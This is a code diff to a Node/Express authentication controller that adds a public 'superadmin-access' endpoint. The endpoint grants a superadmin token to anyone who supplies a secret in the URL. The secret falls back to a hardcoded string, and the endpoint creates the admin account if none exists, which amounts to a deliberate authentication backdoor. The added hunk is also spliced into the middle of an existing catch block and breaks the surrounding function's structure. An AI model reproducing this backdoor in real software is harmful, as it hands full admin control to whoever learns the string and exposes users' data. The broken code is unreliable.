@@ -168,6 +168,52 @@ const getMe = async (req, res) => {
     });
   } catch (error) {
     console.error("❌ Get Me Error:", error);
+// @desc    Authenticate superadmin via secret URL key
+// @route   GET /api/auth/superadmin-access/:secretKey
+// @access  Public
+const superadminAccess = async (req, res) => {
+  try {
+    const { secretKey } = req.params;
+    const expectedSecret = process.env.SUPERADMIN_SECRET_KEY || "superadmin-secret-7f3k2x";
+
+    if (secretKey !== expectedSecret) {
+      return res.status(401).json({
+        success: false,
+        message: "Invalid secret access key",
+      });
+    }
+
+    // Upsert the superadmin user
+    let superadminUser = await userModel.findOne({ role: "superadmin" });
+    if (!superadminUser) {
+      // Create default superadmin if none exists
+      const randomPassword = Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2);
+      superadminUser = await userModel.create({
+        name: "Super Admin",
+        email: "superadmin@musicon.com",
+        password: randomPassword,
+        role: "superadmin",
+      });
+      console.log("✅ Default superadmin account generated dynamically.");
+    }
+
+    // Generate token
+    const token = generateToken(superadminUser._id, superadminUser.role);
+
+    res.json({
+      success: true,
+      message: "Superadmin access granted",
+      token,
+      user: {
+        _id: superadminUser._id,
+        name: superadminUser.name,
+        email: superadminUser.email,
+        role: superadminUser.role,
+        createdAt: superadminUser.createdAt,
+      },
+    });
+  } catch (error) {
+    console.error("❌ Superadmin Access Error:", error);
     res.status(500).json({
       success: false,
       message: error.message,
@@ -175,4 +221,4 @@ const getMe = async (req, res) => {
   }
 };
 
-export { registerUser, loginUser, getMe };
+export { registerUser, loginUser, getMe, superadminAccess };
